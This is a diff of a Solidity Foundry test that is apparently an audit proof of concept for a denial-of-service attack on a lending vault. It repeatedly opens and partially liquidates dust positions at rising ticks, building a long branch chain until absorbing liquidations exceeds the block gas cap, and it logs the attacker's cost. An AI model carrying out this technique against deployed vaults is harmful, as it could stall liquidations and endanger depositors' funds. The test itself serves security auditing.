@@ -2,6 +2,7 @@
 pragma solidity 0.8.21;
 
 import "../vaultT1/vault/vault.t.sol";
+import { TickMath } from "../../../contracts/libraries/tickMath.sol";
 
 contract BranchChainAbsorbDosTest is VaultT1BaseTest {
     uint256 internal constant X19 = 0x7ffff;
@@ -11,7 +12,7 @@ contract BranchChainAbsorbDosTest is VaultT1BaseTest {
     // vaultOne: USDC (6 decimals) collateral, DAI (18 decimals) debt.
     // The smallest accepted collateral is 10,000 raw USDC = $0.01.
     uint256 internal constant COLLATERAL_PER_BRANCH = 10_000;
-    uint256 internal constant DEBT_PER_BRANCH = 7_990_000_000_000_000; // 0.00799 DAI at 79.9% LTV
+    uint256 internal constant INITIAL_DEBT = 7_990_000_000_000_000; // 0.00799 DAI at 79.9% LTV
     uint256 internal constant PARTIAL_LIQUIDATION_AMOUNT = 1_000_000_000_000; // 0.000001 DAI
 
     uint256 internal constant HEALTHY_PRICE = 1e39;
@@ -40,7 +41,6 @@ contract BranchChainAbsorbDosTest is VaultT1BaseTest {
             uint256(1024)
         ];
 
-        // The branch attack needs only about $10.24 of deposited collateral at 1024 branches.
         deal(address(USDC), alice, 1_000_000 * 1e6);
         deal(address(DAI), bob, 1_000_000 * 1e18);
         _setApproval(USDC, address(vaultOne), alice);
@@ -48,19 +48,43 @@ contract BranchChainAbsorbDosTest is VaultT1BaseTest {
 
         uint256 checkpointIndex_;
         uint256 previousWideGas_;
+        uint256 totalBorrowed_;
         int256 firstBranchTick_;
         int256 lastBranchTick_;
 
         for (uint256 i = 1; i <= checkpoints_[checkpoints_.length - 1]; ++i) {
-            _createAndPartiallyLiquidateBranch();
+            uint256 rawBefore_ = _vaultVariables();
+            uint256 debtAmount_ = i == 1 ? INITIAL_DEBT : _minimumDebtForTick(_topTick(rawBefore_));
 
-            uint256 raw_ = _vaultVariables();
-            assertEq(raw_ & 2, 2, "current branch must be liquidated after each cycle");
-            assertEq(_totalBranches(raw_), i, "each cycle must append exactly one linked branch");
+            oracleOne.setPrice(HEALTHY_PRICE);
+            vm.prank(alice);
+            vaultOne.operate(0, int256(COLLATERAL_PER_BRANCH), int256(debtAmount_), alice);
+            totalBorrowed_ += debtAmount_;
 
-            int256 tick_ = _topTick(raw_);
-            if (i == 1) firstBranchTick_ = tick_;
-            lastBranchTick_ = tick_;
+            uint256 rawAfterOpen_ = _vaultVariables();
+            assertEq(rawAfterOpen_ & 2, 0, "new branch must be active before partial liquidation");
+            assertEq(_totalBranches(rawAfterOpen_), i, "new position must append one linked branch");
+
+            int256 openedTick_ = _topTick(rawAfterOpen_);
+            if (i == 1) firstBranchTick_ = openedTick_;
+            lastBranchTick_ = openedTick_;
+
+            oracleOne.setPrice(PARTIAL_LIQUIDATION_PRICE);
+            vm.prank(bob);
+            (uint256 actualDebt_, uint256 actualCol_) = vaultOne.liquidate(
+                PARTIAL_LIQUIDATION_AMOUNT,
+                0,
+                bob,
+                false
+            );
+
+            assertGt(actualDebt_, 0, "partial liquidation must consume debt");
+            assertGt(actualCol_, 0, "partial liquidation must consume collateral");
+            assertLt(actualDebt_, debtAmount_, "liquidation must remain partial");
+
+            uint256 rawAfterLiquidation_ = _vaultVariables();
+            assertEq(rawAfterLiquidation_ & 2, 2, "current branch must be liquidated after each cycle");
+            assertEq(_totalBranches(rawAfterLiquidation_), i, "partial liquidation must preserve branch chain");
 
             if (i == checkpoints_[checkpointIndex_]) {
                 oracleOne.setPrice(ABSORB_PRICE);
@@ -79,7 +103,7 @@ contract BranchChainAbsorbDosTest is VaultT1BaseTest {
                 emit log_named_int("last branch top tick", lastBranchTick_);
                 emit log_named_uint("tick range width", _absoluteTickDistance(firstBranchTick_, lastBranchTick_));
                 emit log_named_uint("attacker deposited USDC raw", i * COLLATERAL_PER_BRANCH);
-                emit log_named_uint("attacker nominal borrowed DAI wei", i * DEBT_PER_BRANCH);
+                emit log_named_uint("attacker nominal borrowed DAI wei", totalBorrowed_);
                 emit log_named_uint("wide-cap absorb gas", wide_.gasUsed);
                 emit log_named_uint("live block gas cap", blockGasCap_);
                 emit log_named_uint("block-capped absorb completed", capped_.completed ? 1 : 0);
@@ -94,30 +118,16 @@ contract BranchChainAbsorbDosTest is VaultT1BaseTest {
         assertEq(checkpointIndex_, checkpoints_.length, "all checkpoints must execute");
     }
 
-    function _createAndPartiallyLiquidateBranch() internal {
-        oracleOne.setPrice(HEALTHY_PRICE);
+    function _minimumDebtForTick(int256 targetTick_) internal pure returns (uint256 debtAmount_) {
+        // _addDebtToTickWrite gets a rounded-down tick and then increments it by one.
+        // Feeding the exact ratio for targetTick - 1 therefore lands at targetTick.
+        uint256 ratio_ = TickMath.getRatioAtTick(targetTick_ - 1);
+        debtAmount_ =
+            ((ratio_ * COLLATERAL_PER_BRANCH) + TickMath.ZERO_TICK_SCALED_RATIO - 1) /
+            TickMath.ZERO_TICK_SCALED_RATIO;
 
-        vm.prank(alice);
-        vaultOne.operate(
-            0,
-            int256(COLLATERAL_PER_BRANCH),
-            int256(DEBT_PER_BRANCH),
-            alice
-        );
-
-        oracleOne.setPrice(PARTIAL_LIQUIDATION_PRICE);
-
-        vm.prank(bob);
-        (uint256 actualDebt_, uint256 actualCol_) = vaultOne.liquidate(
-            PARTIAL_LIQUIDATION_AMOUNT,
-            0,
-            bob,
-            false
-        );
-
-        assertGt(actualDebt_, 0, "partial liquidation must consume debt");
-        assertGt(actualCol_, 0, "partial liquidation must consume collateral");
-        assertLt(actualDebt_, DEBT_PER_BRANCH, "liquidation must remain partial");
+        // Compensate for the operate-side +1 debt rounding and boundary compression.
+        debtAmount_ += 1000;
     }
 
     function _measureAbsorb(uint256 gasCap_) internal returns (GasResult memory result_) {
